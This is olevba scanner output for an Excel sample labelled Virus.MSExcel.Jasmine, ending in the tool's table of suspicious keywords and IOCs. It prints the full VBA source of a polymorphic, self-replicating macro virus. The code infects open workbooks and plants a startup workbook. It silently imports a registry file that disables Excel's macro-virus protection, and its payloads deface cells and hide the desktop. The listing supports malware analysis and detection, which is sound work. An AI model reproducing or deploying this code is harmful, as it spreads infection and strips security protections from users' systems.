olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Jasmine-a28d01de5c52037bffdcb80cf911581fcf9e2a0a
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: Virus.MSExcel.Jasmine-a28d01de5c52037bffdcb80cf911581fcf9e2a0a - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Excel97.Jasmine v1.2
'Copyright (c) 1999, cry0tek

Public Eg6Hd9On1Aw7Xt5Ic2Fg1Um9Ph4Ss0, Pv1Ce0As6Wv2Sa8Nx9Ng0 As Boolean
'Jasmine
Private Sub Workbook_WindowDeactivate(ByVal Wn As Excel.Window)
On Error Resume Next
    ' Our error handler
Dim Mq4Yi0 As Object
    ' To be used by the poly engine
Wu8Wr6Hp4Py6Kw4 = "c:\remove.reg": Ev2At0Qn4Wz6Yn2 = "[HKEY_CURRENT_USER\Software\Microsoft\Office\"
For i = 1 To Workbooks.Count
    ' Let's count the workbooks
 Set Mq4Yi0 = Workbooks(i).VBProject.VBComponents.Item("ThisWorkbook").CodeModule
    ' The object we will infect
 Randomize
 If Mq4Yi0.Lines(5, 1) = "'Jasmine" Then
    ' If our marker exists, we know that this sheet is infected
  Call Encode(Mq4Yi0)
    ' Polymorphic engine
  Cb3Ek4Jf4Ar9Er2Zr6 = Mq4Yi0.Lines(1, _
   Mq4Yi0.CountOfLines)
    ' Get our current location
  GoTo Jx2Gh5Bv4Ak4
 End If
 For j = 1 To Workbooks(i).VBProject.VBComponents.Count
  Set Il2 = Workbooks(i).VBProject.VBComponents.Item(j)
  Yl9Mv5Ie3Xx0Iw0Vg8El9Hy8Od2 = Il2.Name
  Set Mq4Yi0 = Il2.CodeModule
  If InStr(1, Yl9Mv5Ie3Xx0Iw0Vg8El9Hy8Od2, "Sheet") Then
   If Mq4Yi0.Lines(5, 1) = "'Jasmine" Then _
    Call Encode(Mq4Yi0)
    Cb3Ek4Jf4Ar9Er2Zr6 = Workbooks(i).VBProject.VBComponents _
    .Item(j).CodeModule.Lines(1, Mq4Yi0.CountOfLines)
    GoTo Jx2Gh5Bv4Ak4
  End If
 Next
Next
Jx2Gh5Bv4Ak4:
If UCase(Dir(Application.StartupPath + "\Book1.")) <> UCase("BOOK1") Then
    ' If Book1. doesn't exist
 If Eg6Hd9On1Aw7Xt5Ic2Fg1Um9Ph4Ss0 <> True Then
  Eg6Hd9On1Aw7Xt5Ic2Fg1Um9Ph4Ss0 = True: Pv1Ce0As6Wv2Sa8Nx9Ng0 = True
  Workbooks.Add.SaveAs FileName:=Application.StartupPath & "\BOOK1.", FileFormat:=xlNormal, AddToMru:=False
 End If
End If
For i = 1 To Workbooks.Count
 Set Mq4Yi0 = Workbooks(i).VBProject.VBComponents.Item("ThisWorkbook").CodeModule
 If Mq4Yi0.Lines(5, 1) <> "'Jasmine" Then
  Mq4Yi0.InsertLines 1, Cb3Ek4Jf4Ar9Er2Zr6
  Mq4Yi0.ReplaceLine 6, "Private Sub Workbook_WindowDeactivate(ByVal Wn As Excel.Window)"
 End If
  For ii = 1 To Workbooks(i).VBProject.VBComponents.Count
   Set Il2 = Workbooks(i).VBProject.VBComponents.Item(ii)
   Yl9Mv5Ie3Xx0Iw0Vg8El9Hy8Od2 = Il2.Name
   Set Infline = Il2.CodeModule
   If Infline.Lines(5, 1) <> "'Jasmine" Then
    If InStr(1, Yl9Mv5Ie3Xx0Iw0Vg8El9Hy8Od2, "Sheet") Then
     Il2.CodeModule.InsertLines 1, Cb3Ek4Jf4Ar9Er2Zr6
     Il2.CodeModule.ReplaceLine 6, "Private Sub WorkBook_Activate()"
    End If
   End If
  Next
Next
If Pv1Ce0As6Wv2Sa8Nx9Ng0 = True Then
 Pv1Ce0As6Wv2Sa8Nx9Ng0 = False
 Workbooks("Book1.").Close savechanges:=True
    ' Close the workbook and save the changes
 Open Wu8Wr6Hp4Py6Kw4 For Output As 1
    ' Let's create the registry file
 Print #1, "REGEDIT4"
 If Left(Application.Version, 1) = 9 Then
    ' If we are in MS Excel 2000, the virus protection feature is different
  Print #1, Ev2At0Qn4Wz6Yn2 & "9.0\Excel\Security]"
  Print #1, """Level""=dword:00000001"
 Else
    ' Else nullify virus protection using the standard method
  Print #1, Ev2At0Qn4Wz6Yn2 & "8.0\Excel\Microsoft Excel]"
  Print #1, """Options6""=dword:00000000"
  Print #1, Ev2At0Qn4Wz6Yn2 & "8.0\New User\Settings\Excel\Microsoft Excel]"
  Print #1, """Options6""=dword:00000000"
  Print #1, Ev2At0Qn4Wz6Yn2 & "8.0\Excel\Microsoft Excel]"
  Print #1, """Options6""=dword:00000000"
 End If
 Close 1
 Shell "regedit /s " & Wu8Wr6Hp4Py6Kw4, vbHide
    ' Execute regedit.exe
 Kill Wu8Wr6Hp4Py6Kw4
    ' Let's remove the file we created
End If
If Minute(Now) = Second(Now) Then
 Select Case Day(Now)
  Case 1 To 5 And Int((5 * Rnd) + 1) = 1
   Application.StatusBar = "Excel97.Jasmine v1.2"
  Case 6 To 10 And Int((5 * Rnd) + 1) = 1
   With Assistant.NewBalloon
    .Heading = "Excel97.Jasmine v1.2"
    .Text = "Since the only time I see her near" & vbCr & "Is when I close my eyes" & vbCr & _
            "Should I keep it that way" & vbCr & "The only way I can make her stay..." & vbCr & vbCr
    .Animation = 22
    .Show
   End With
  Case 11 To 20 And Int((5 * Rnd) + 1) = 1
   For i = 1 To 600 Step Int((Rnd * 2) + 1)
    Fe3Cd1Ys9Io6Gc4Hr4Mi5 = Chr(65 + Int(Rnd * 26))
    j = Fe3Cd1Ys9Io6Gc4Hr4Mi5 & (Int(Rnd * 20) + 1)
    Range(j).Select
    ActiveCell.FormulaR1C1 = "Excel97.Jasmine"
    Range(j).Select
    With Selection.Font
     .Name = "Arial"
     .Size = 10
    End With
    Range(j).Select
    With Selection.Interior
     .ColorIndex = Int((Rnd * 56) + 1)
     .Pattern = xlSolid
    End With
    Columns(Fe3Cd1Ys9Io6Gc4Hr4Mi5 & ":" _
     & Fe3Cd1Ys9Io6Gc4Hr4Mi5).EntireColumn.AutoFit
    Selection.Font.ColorIndex = Int((Rnd * 56) + 1)
   Next
  Case 21 To 30 And Int((5 * Rnd) + 1) = 1
   System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoDesktop") = 1&
  Case 31 And Int((5 * Rnd) + 1) = 1
   MsgBox "", vbInformation, "Excel97.Jasmine v1.2"
 End Select
End If
End Sub
Private Sub Encode(Loc As Object)
On Error Resume Next
Dim varray(1 To 14) As String
Dim Yj8Mp8Un9Om7Is0Wp8Kl0Eh7Dp1Jj8 As Long: Dim Cp8Pn7Uc0Nd9Jr6Fs1Wh3Az3Ha3 As Long: Dim Bk9Xu1Kr6Qr5Gh4Xc8Nb9Et2Bg6 As Long: Dim Ez9Oh8Gm9Fr3Ij8Ol5Dm4Or0Rm8Ci8 As Long
varray(1) = "Wu8Wr6Hp4Py6Kw4": varray(2) = "Mq4Yi0": varray(3) = "Cb3Ek4Jf4Ar9Er2Zr6": varray(4) = "Il2": varray(5) = "Yl9Mv5Ie3Xx0Iw0Vg8El9Hy8Od2": varray(6) = "Ev2At0Qn4Wz6Yn2": varray(7) = "Eg6Hd9On1Aw7Xt5Ic2Fg1Um9Ph4Ss0"
varray(8) = "Pv1Ce0As6Wv2Sa8Nx9Ng0": varray(9) = "Fe3Cd1Ys9Io6Gc4Hr4Mi5": varray(10) = "Yj8Mp8Un9Om7Is0Wp8Kl0Eh7Dp1Jj8": varray(11) = "Cp8Pn7Uc0Nd9Jr6Fs1Wh3Az3Ha3": varray(12) = "Bk9Xu1Kr6Qr5Gh4Xc8Nb9Et2Bg6": varray(13) = "Ez9Oh8Gm9Fr3Ij8Ol5Dm4Or0Rm8Ci8": varray(14) = "Jx2Gh5Bv4Ak4"
Randomize
For i = 1 To 14
 For j = 1 To Int((10 * Rnd) + 1)
  PolyVal = PolyVal + Chr(65 + Int(Rnd * 26)) & Chr(122 - Int(Rnd * 26)) & Chr(48 + Int(Rnd * 10))
 Next
 With Loc
  Yj8Mp8Un9Om7Is0Wp8Kl0Eh7Dp1Jj8 = 1: Cp8Pn7Uc0Nd9Jr6Fs1Wh3Az3Ha3 = 1: Bk9Xu1Kr6Qr5Gh4Xc8Nb9Et2Bg6 = .CountOfLines: Ez9Oh8Gm9Fr3Ij8Ol5Dm4Or0Rm8Ci8 = Len(.Lines(.CountOfLines, 1))
  Do While .Find(varray(i), Yj8Mp8Un9Om7Is0Wp8Kl0Eh7Dp1Jj8, Cp8Pn7Uc0Nd9Jr6Fs1Wh3Az3Ha3, Bk9Xu1Kr6Qr5Gh4Xc8Nb9Et2Bg6, Ez9Oh8Gm9Fr3Ij8Ol5Dm4Or0Rm8Ci8, True)
   strVal = .Lines(Yj8Mp8Un9Om7Is0Wp8Kl0Eh7Dp1Jj8, 1)
   strVal = Left(strVal, Cp8Pn7Uc0Nd9Jr6Fs1Wh3Az3Ha3 - 1) & PolyVal & Mid(strVal, Ez9Oh8Gm9Fr3Ij8Ol5Dm4Or0Rm8Ci8)
   .ReplaceLine Yj8Mp8Un9Om7Is0Wp8Kl0Eh7Dp1Jj8, strVal
   Yj8Mp8Un9Om7Is0Wp8Kl0Eh7Dp1Jj8 = Bk9Xu1Kr6Qr5Gh4Xc8Nb9Et2Bg6 + 1: Cp8Pn7Uc0Nd9Jr6Fs1Wh3Az3Ha3 = 1
   Bk9Xu1Kr6Qr5Gh4Xc8Nb9Et2Bg6 = .CountOfLines: Ez9Oh8Gm9Fr3Ij8Ol5Dm4Or0Rm8Ci8 = Len(.Lines(.CountOfLines, 1))
  Loop
 End With
 PolyVal = ""
Next
End Sub


-------------------------------------------------------------------------------
VBA MACRO Foglio1.cls 
in file: Virus.MSExcel.Jasmine-a28d01de5c52037bffdcb80cf911581fcf9e2a0a - OLE stream: '_VBA_PROJECT_CUR/VBA/Foglio1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Foglio2.cls 
in file: Virus.MSExcel.Jasmine-a28d01de5c52037bffdcb80cf911581fcf9e2a0a - OLE stream: '_VBA_PROJECT_CUR/VBA/Foglio2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Foglio3.cls 
in file: Virus.MSExcel.Jasmine-a28d01de5c52037bffdcb80cf911581fcf9e2a0a - OLE stream: '_VBA_PROJECT_CUR/VBA/Foglio3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Foglio
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Foglio
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Foglio
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |WorkBook_Activate   |Runs when the Excel Workbook is opened       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|create              |May execute file or a system command through |
|          |                    |WMI                                          |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |remove.reg          |Executable file name                         |
|IOC       |regedit.exe         |Executable file name                         |
+----------+--------------------+---------------------------------------------+

